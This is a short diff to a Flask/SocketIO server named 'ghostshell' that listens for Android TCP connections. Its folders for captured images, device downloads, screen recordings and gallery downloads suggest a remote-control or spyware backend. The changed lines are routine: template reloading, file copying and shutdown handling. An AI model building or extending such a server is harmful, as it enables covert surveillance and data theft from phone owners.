@@ -17,7 +17,7 @@ from flask_socketio import SocketIO, emit
 import io
 
 # --- Railway Configuration ---
-HTTP_PORT = int(os.environ.get('PORT', 8080))  # Railway HTTP port (dari environment)
+HTTP_PORT = int(os.environ.get('PORT', 8080))  # Railway HTTP port
 TCP_PORT = 9090  # Port untuk Android TCP connection (INTERNAL)
 HOST = '0.0.0.0'
 
@@ -44,6 +44,7 @@ app = Flask(__name__,
             static_folder='static', 
             template_folder='templates')
 app.config['SECRET_KEY'] = 'ghostshell-railway-secret'
+app.config['TEMPLATES_AUTO_RELOAD'] = True
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=False, engineio_logger=False)
 
 # --- Setup ---
@@ -55,6 +56,12 @@ logger = logging.getLogger(__name__)
 for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads', 'templates']:
     if not os.path.exists(dir_name):
         os.makedirs(dir_name)
+
+# Copy index.html ke templates jika ada
+if os.path.exists('index.html'):
+    import shutil
+    shutil.copy('index.html', 'templates/index.html')
+    print(f"{Fore.GREEN}[✓] index.html copied to templates folder{Style.RESET_ALL}")
 
 # =============== FUNGSI TCP SERVER ===============
 
@@ -443,5 +450,10 @@ if __name__ == '__main__':
     tcp_thread = threading.Thread(target=tcp_server, daemon=True)
     tcp_thread.start()
     
-    # Jalankan Flask HTTP server
-    socketio.run(app, host=HOST, port=HTTP_PORT, debug=False, allow_unsafe_werkzeug=True)
+    # Jalankan Flask HTTP server dengan Python langsung
+    try:
+        socketio.run(app, host=HOST, port=HTTP_PORT, debug=False, allow_unsafe_werkzeug=True)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Server stopped by user{Style.RESET_ALL}")
+        running = False
+        sys.exit(0)
